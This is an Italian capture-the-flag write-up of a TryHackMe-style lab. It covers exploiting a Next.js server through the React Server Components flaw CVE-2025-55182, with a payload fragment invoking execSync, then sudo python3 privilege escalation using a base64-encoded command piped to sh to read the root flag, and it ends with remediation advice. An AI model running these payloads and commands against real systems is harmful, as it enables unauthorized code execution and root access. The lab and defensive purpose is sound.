📋 Post-Mortem \& Debrief Tecnico: Corp Website (Romance \& Co)

FASE 1: Enumerazione \& Ricognizione (Recon)

1\. Il modulo di contatto e i controlli Client-Side



&#x20;   Cosa è successo: Compilando il form senza @, il browser mostrava un popup di errore.



&#x20;   Perché: Quello era un controllo HTML5/JavaScript eseguito esclusivamente lato client (nel tuo browser). Non inviava alcuna richiesta di rete finché il campo non sembrava valido.



&#x20;   La richiesta GET /?: Una volta inserita la mail fittizia, partiva solo una GET /?. Il form non inviava dati al backend (era finto/statico o privo di listener di invio).



2\. Directory Fuzzing con Gobuster



&#x20;   Comando:

&#x20;   code Bash



&#x20;   gobuster dir -u http://<TARGET>:3000 -w /usr/share/wordlists/dirb/common.txt -t 5



&#x20;   Risultato: Gobuster ha segnalato /cgi-bin/ (Status: 308).



&#x20;   Cosa significa 308 (Permanent Redirect): Il server dice che la risorsa è stata spostata altrove e obbliga il client a mantenere lo stesso metodo HTTP.



&#x20;   Perché con -r è sparito: Aggiungendo il flag -r (follow redirects), Gobuster ha seguito il redirect; arrivando su una pagina che rispondeva con 404 (o errore), ha scartato l'endpoint. Era un tipico rabbit hole (falsa pista).



FASE 2: Identificazione della Vulnerabilità (Weaponization)

1\. Ispezione degli Header di Risposta



Osservando la risposta alla GET / su Burp Suite abbiamo notato:



&#x20;   X-Powered-By: Next.js



&#x20;   Vary: rsc, next-router-state-tree, ...



&#x20;   Commenti nel codice sorgente: <!--3WpzTMYEK9QG0eqIBQxrR--> (che era il Build ID di Next.js) e annotazioni React Server Components (<!--$-->).



Questo ci ha confermato che l'applicazione usava i React Server Components (RSC) e il protocollo di serializzazione interno chiamato Flight.

2\. Il test con l'header Next-Action



&#x20;   Abbiamo inviato una richiesta POST /? con l'header Next-Action: dummy.



&#x20;   Il server ha risposto: "Server action not found."



&#x20;   Perché è stato cruciale: Questo errore ha dimostrato che il server accettava chiamate dirette alle Server Actions e cercava di risolverle.



Questo ci ha indirizzati sulla vulnerabilità nota CVE-2025-55182 (chiamata anche React2Shell). In questa vulnerabilità, l'invio di dati multipart/form-data appositamente manipolati manda in tilt il deserializzatore di React Flight, permettendo di modificare i prototipi degli oggetti JavaScript (Prototype Pollution) e invocare moduli interni di Node.js come child\_process.execSync per eseguire comandi di sistema sul server (Remote Code Execution - RCE).

FASE 3: Troubleshooting dell'Exploit \& Gestione dell'Ambiente



Qui è dove si è concentrata la maggior parte della fatica. Analizziamo ogni singolo problema.

1\. Il primo script bash (exploit-nextjs.sh)



&#x20;   Cosa faceva:

&#x20;   Costruiva a mano un pacchetto HTTP multipart con il payload malicious:

&#x20;   code JSON



&#x20;   {"then":"$1:\_\_proto\_\_:then", ... "\_prefix":"process.mainModule.require('child\_process').execSync('...');"}



&#x20;   Perché non vedevamo l'output:

&#x20;   Leggendo il sorgente dello script abbiamo scoperto questa riga:

&#x20;   code Bash



&#x20;   curl -s -o /dev/null -w "%{http\_code}" ...



&#x20;   Lo script scartava deliberatamente il corpo della risposta (-o /dev/null) e controllava solo il codice HTTP o il timeout. L'RCE avveniva alla cieca (Blind RCE).



2\. Lo script Python e l'errore di runtime



&#x20;   Comando:

&#x20;   code Bash



&#x20;   python3 exploit.py -u http://<TARGET>:3000 -c "whoami"



&#x20;   Errore ricevuto:

&#x20;   code Text



&#x20;   TypeError: 'type' object is not subscriptable



&#x20;   Perché è successo:

&#x20;   Nel prompt del terminale si leggeva /usr/local/pyenv/versions/3.8.20/.

&#x20;   L'ambiente usava Python 3.8. Lo script e le librerie scaricate usavano le type annotations moderne (es. list\[dict] o def load() -> list\[...]), introdotte solo da Python 3.9 in su. Su Python 3.8 quella sintassi causa un crash immediato dell'interprete.



&#x20;   La soluzione corretta:

&#x20;   Usare pyenv per forzare l'interprete a una versione recente già presente nella VM:

&#x20;   code Bash



&#x20;   pyenv local 3.11.9



&#x20;   Con Python 3.11, lo script ha compilato il codice senza errori e ha stampato:

&#x20;   code Text



&#x20;   Success

&#x20;   daniel



&#x20;   Questo ha confermato l'accesso iniziale al sistema come utente a basso privilegio (daniel).



FASE 4: Recupero delle Flag (Exploitation \& PrivEsc)

1\. User Flag



Con l'RCE stabilizzata, abbiamo letto direttamente il file nella home dell'utente:

code Bash



python3 exploit.py -u http://<TARGET>:3000 -c "cat /home/daniel/user.txt"



&#x20;   Risultato: THM{R34c7\_2\_5h311\_3xpl017}



2\. Privilege Escalation (Audit dei permessi Sudo)



Per capire come diventare root, abbiamo interrogato le regole sudo con:

code Bash



python3 exploit.py -u http://<TARGET>:3000 -c "sudo -l -n"



(Nota sul flag -n / non-interactive: impedisce a sudo di attendere all'infinito l'inserimento interattivo di una password nel caso in cui non sia configurato NOPASSWD, evitando il blocco della richiesta).



&#x20;   Output del server:

&#x20;   code Text



&#x20;   User daniel may run the following commands on romance:

&#x20;       (root) NOPASSWD: /usr/bin/python3



&#x20;   Analisi della misconfigurazione: L'utente daniel può eseguire l'interprete /usr/bin/python3 come utente root senza password. Da Python è possibile importare librerie di sistema, aprire file protetti o lanciare una shell di root.



3\. La Root Flag e il problema delle virgolette (Escape Hell)



Quando abbiamo provato a eseguire:

code Bash



python3 exploit.py -u ... -c "sudo python3 -c 'import os; os.system(\\"cat /root/root.txt\\")'"



Abbiamo ricevuto: Failed (status: 500).



&#x20;   Perché è fallito:

&#x20;   La stringa doveva attraversare 4 livelli di parsing:



&#x20;       La shell Bash della tua AttackBox.



&#x20;       Lo script exploit.py sul tuo computer.



&#x20;       Il payload JSON inviato via HTTP dentro la proprietà execSync('...').



&#x20;       La shell del server bersaglio.



&#x20;   Le virgolette annidate (", ', \\") hanno spezzato la stringa a metà del tragitto, generando un errore di sintassi JavaScript in Node.js sul server (da cui l'HTTP 500).



4\. Il bypass definitivo: Base64 Encoding



Per aggirare totalmente i caratteri speciali e le virgolette annidate, abbiamo convertito l'intero comando da eseguire in una stringa Base64:



&#x20;   Comando originale:

&#x20;   code Bash



&#x20;   sudo /usr/bin/python3 -c 'print(open("/root/root.txt").read())'



&#x20;   Convertito in Base64:

&#x20;   code Text



&#x20;   c3VkbyAvdXNyL2Jpbi9weXRob24zIC1jICdwcmludChvcGVuKCIvcm9vdC9yb290LnR4dCIpLnJlYWQoKSkn



&#x20;   Payload eseguito:

&#x20;   code Bash



&#x20;   echo c3VkbyAvdXNyL2Jpbi9weXRob24zIC1jICdwcmludChvcGVuKCIvcm9vdC9yb290LnR4dCIpLnJlYWQoKSkn | base64 -d | sh



&#x20;   Cosa fa questo comando sul server:



&#x20;       echo <STRINGA>: stampa la stringa alfanumerica pulita (nessun apice o virgoletta).



&#x20;       | base64 -d: decodifica la stringa ripristinando il comando originale in memoria.



&#x20;       | sh: passa il comando direttamente alla shell di sistema che lo esegue con i privilegi di root.



&#x20;   Risultato:

&#x20;   code Text



&#x20;   Success

&#x20;   THM{Pr1v\_35c\_47\_175\_f1n357}



🛡️ Sintesi Difensiva (Remediation)

Vulnerabilità riscontrata	Causa root	Contromisura raccomandata

CVE-2025-55182 (React2Shell)	Deserializzazione insicura dei dati Flight/RSC in Next.js con inquinamento del prototipo.	Aggiornamento immediato dei pacchetti next e react alle versioni corrette dal vendor.

Sudo Misconfiguration	Permesso NOPASSWD assegnato all'interprete /usr/bin/python3 nel file /etc/sudoers.	Rispettare il principio del minimo privilegio; non concedere sudoers su interpreti interattivi (Python, Perl, Bash, Vim) che consentono shell breakout (GTFOBins).

